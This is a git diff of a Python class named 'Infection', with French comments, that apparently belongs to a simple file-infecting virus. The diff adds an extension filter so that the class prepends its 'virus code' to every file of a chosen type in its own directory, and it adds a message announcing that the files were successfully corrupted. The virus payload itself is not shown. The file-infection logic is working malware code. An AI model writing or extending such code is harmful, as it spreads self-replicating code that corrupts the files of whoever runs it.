@@ -1,6 +1,10 @@
 class Infection:
-    def __init__(self):
-        pass
+    def __init__(self, extension: str = ""):
+        self.__extension = extension
+
+    @property
+    def extension(self):
+        return self.__extension
 
     def print_in_file(self, lines, filename):
         """Ecrit dans un fichier
@@ -50,6 +54,8 @@ class Infection:
 
         for f in list_of_files:
             self.insert_lines_at_start(lines, f)
+        print(
+            f"\nFichier corrompu avec succès✅. Jetez un coup d'oeil sur vos fichier {self.extension}")
 
     # Scan
     # Par convention __attribute__ est un attribut d'un module
@@ -69,12 +75,14 @@ class Infection:
             p = __file__.split('/')
             return "/".join(p[:-2])
 
-    def get_py_file_in_current_dir(self):
+    def get_file_in_current_dir(self):
         """renvoie une liste des fichiers présents dans le répertoire ou se trouve le fichier
         """
 
         import os
-        print(os.listdir(self.get_dir()))
+        # print(os.listdir(self.get_dir()))
+        if self.extension:
+            return filter(lambda x: x[x.index(".")+1:] == self.extension, [filename for filename in os.listdir(self.get_dir()) if "." in filename and filename != "main.py" and filename != ".gitignore"])
         return [filename for filename in os.listdir(self.get_dir()) if "." in filename and filename != "main.py"]
 
     def get_virus_code(self):
@@ -94,4 +102,4 @@ class Infection:
         """
 
         self.insert_lines_at_files_in_list(
-            self.get_virus_code(), self.get_py_file_in_current_dir())
+            self.get_virus_code(), self.get_file_in_current_dir())
